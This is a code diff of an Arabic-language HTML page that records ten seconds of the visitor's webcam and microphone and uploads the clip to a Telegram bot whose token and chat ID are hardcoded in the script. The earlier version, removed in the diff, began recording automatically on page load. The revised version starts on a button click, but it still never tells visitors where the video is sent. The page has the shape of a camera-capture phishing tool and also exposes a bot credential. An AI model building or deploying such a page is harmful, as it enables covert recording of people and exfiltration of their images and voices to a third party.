@@ -8,50 +8,65 @@
         body { text-align: center; font-family: Arial, sans-serif; }
         video { width: 90%; max-width: 600px; border: 2px solid black; display: none; }
         .loading { font-size: 20px; color: red; }
+        button { margin-top: 10px; padding: 10px 20px; font-size: 16px; }
     </style>
 </head>
 <body>
 
-    <h2 id="status">جارٍ تشغيل الكاميرا والتسجيل...</h2>
+    <h2 id="status">اضغط على الزر لتشغيل الكاميرا والتسجيل</h2>
     <video id="video" autoplay></video>
+    <button id="startRecording">بدء التسجيل</button>
 
     <script>
         let botToken = "7804774413:AAFBhGgO5v-5vKMKfJ2g9IrCcjb3XBnpUZE"; // استبدلي بتوكن البوت
         let chatId = "6917296987"; // استبدلي بمعرف البوت أو المجموعة
         let videoElement = document.getElementById("video");
         let statusText = document.getElementById("status");
+        let startButton = document.getElementById("startRecording");
         let mediaRecorder;
         let recordedChunks = [];
 
-        // تشغيل الكاميرا والميكروفون
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-            .then(stream => {
-                videoElement.srcObject = stream;
-                videoElement.style.display = "block"; // إظهار الفيديو
-                statusText.innerText = "يتم التسجيل الآن...";
+        // التأكد من تشغيل الكود فقط على HTTPS
+        if (location.protocol !== "https:") {
+            statusText.innerText = "❌ يجب تشغيل الكود على HTTPS!";
+            startButton.style.display = "none";
+        }
 
-                mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.ondataavailable = event => recordedChunks.push(event.data);
+        // تشغيل الكاميرا فقط عند الضغط على الزر
+        startButton.addEventListener("click", () => {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(stream => {
+                    videoElement.srcObject = stream;
+                    videoElement.style.display = "block";
+                    statusText.innerText = "يتم التسجيل الآن...";
+                    startButton.style.display = "none";
 
-                mediaRecorder.onstop = () => {
-                    let blob = new Blob(recordedChunks, { type: "video/webm" });
-                    sendVideoToTelegram(blob);
-                };
+                    mediaRecorder = new MediaRecorder(stream);
+                    recordedChunks = [];
 
-                // بدء التسجيل تلقائيًا
-                recordedChunks = [];
-                mediaRecorder.start();
+                    mediaRecorder.ondataavailable = event => recordedChunks.push(event.data);
+                    mediaRecorder.onstop = () => {
+                        if (recordedChunks.length > 0) {
+                            let blob = new Blob(recordedChunks, { type: "video/webm" });
+                            sendVideoToTelegram(blob);
+                        } else {
+                            statusText.innerText = "❌ لم يتم تسجيل أي فيديو!";
+                        }
+                    };
 
-                // إيقاف التسجيل بعد 10 ثوانٍ تلقائيًا
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                    statusText.innerText = "جارٍ إرسال الفيديو...";
-                }, 10000);
-            })
-            .catch(error => {
-                statusText.innerText = "❌ لا يمكن تشغيل الكاميرا! تأكدي من الأذونات.";
-                console.error(error);
-            });
+                    mediaRecorder.start();
+
+                    // إيقاف التسجيل بعد 10 ثوانٍ تلقائيًا
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                        statusText.innerText = "جارٍ إرسال الفيديو...";
+                    }, 10000);
+                })
+                .catch(error => {
+                    statusText.innerText = "❌ لا يمكن تشغيل الكاميرا! تأكدي من الأذونات.";
+                    console.error("Camera Error:", error);
+                });
+        });
 
         function sendVideoToTelegram(videoBlob) {
             let formData = new FormData();
@@ -71,11 +86,12 @@
                     }, 2000);
                 } else {
                     statusText.innerText = "❌ فشل في إرسال الفيديو!";
+                    console.error("Telegram API Error:", data);
                 }
             })
             .catch(error => {
                 statusText.innerText = "❌ خطأ في الاتصال!";
-                console.error(error);
+                console.error("Fetch Error:", error);
             });
         }
     </script>
